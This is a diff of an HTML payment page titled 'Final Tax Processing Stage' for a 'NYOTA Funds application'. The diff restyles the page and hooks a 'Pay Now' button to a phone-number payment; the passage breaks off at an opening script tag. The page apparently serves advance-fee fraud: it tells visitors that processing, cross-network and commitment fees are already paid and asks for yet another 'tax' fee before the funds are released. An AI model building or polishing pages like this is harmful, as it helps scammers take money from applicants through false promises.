@@ -6,61 +6,89 @@
 <title>Final Tax Processing Stage</title>
 
 <style>
+
 body{
-    margin:0;
-    padding:15px;
-    background:#0b6b0b;
-    font-family:Arial,sans-serif;
+margin:0;
+padding:15px;
+background:#0b6b0b;
+font-family:Arial,sans-serif;
 }
 
 .container{
-    max-width:420px;
-    margin:auto;
+max-width:420px;
+margin:auto;
 }
 
 .card{
-    background:white;
-    padding:20px;
-    border-radius:10px;
+background:white;
+padding:20px;
+border-radius:10px;
 }
 
 h1{
-    text-align:center;
-    color:#1565c0;
-    font-size:24px;
+text-align:center;
+color:#1565c0;
+font-size:24px;
+margin-bottom:20px;
 }
 
 .status{
-    color:green;
-    font-size:18px;
-    line-height:35px;
-    text-align:center;
+font-size:17px;
+line-height:35px;
+color:green;
+text-align:center;
+margin-bottom:20px;
 }
 
-p{
-    text-align:center;
-    font-size:16px;
+.info{
+text-align:center;
+font-size:16px;
+line-height:25px;
+margin-bottom:20px;
+}
+
+.amount{
+text-align:center;
+font-size:22px;
+font-weight:bold;
+color:#1565c0;
+margin-bottom:20px;
+}
+
+label{
+display:block;
+font-weight:bold;
+margin-top:10px;
 }
 
 input{
-    width:100%;
-    padding:12px;
-    margin-top:15px;
-    border-radius:8px;
-    border:1px solid #ccc;
-    box-sizing:border-box;
+width:100%;
+padding:12px;
+margin-top:6px;
+border-radius:8px;
+border:1px solid #ccc;
+box-sizing:border-box;
 }
 
 button{
-    width:100%;
-    padding:14px;
-    margin-top:20px;
-    background:#1565c0;
-    color:white;
-    border:none;
-    border-radius:8px;
-    font-size:18px;
+width:100%;
+padding:14px;
+margin-top:20px;
+background:#1565c0;
+color:white;
+border:none;
+border-radius:8px;
+font-size:18px;
+cursor:pointer;
 }
+
+#stkMessage{
+margin-top:15px;
+text-align:center;
+font-size:15px;
+color:#1565c0;
+}
+
 </style>
 </head>
 
@@ -72,31 +100,30 @@ button{
 <h1>Final Tax Processing Stage</h1>
 
 <div class="status">
-✅ Processing fee paid<br>
-✅ Cross-network fee paid<br>
-✅ Commitment fee paid
+✅ Processing Fee Paid<br>
+✅ Cross-Network Fee Paid<br>
+✅ Commitment Fee Paid
 </div>
 
-<p>
-You're in the final tax processing stage.
-Complete the tax payment to finalize your NYOTA Funds application.
-</p>
+<div class="info">
+Congratulations! Your application has reached the final tax processing stage. Complete the payment below to finalize the processing of your NYOTA Funds application.
+</div>
 
-<p><b>Tax Processing Fee: Ksh 2</b></p>
+<div class="amount">
+Tax Processing Fee: Ksh 2
+</div>
+
+<label>Phone Number</label>
 
 <input
 type="tel"
 id="phone"
 placeholder="2547XXXXXXXX">
 
-<button id="payBtn">
+<button id="payBtn" onclick="payNow()">
 Pay Now
 </button>
 
 <p id="stkMessage"></p>
 
-</div>
-</div>
-
-</body>
-</html>
+<script>
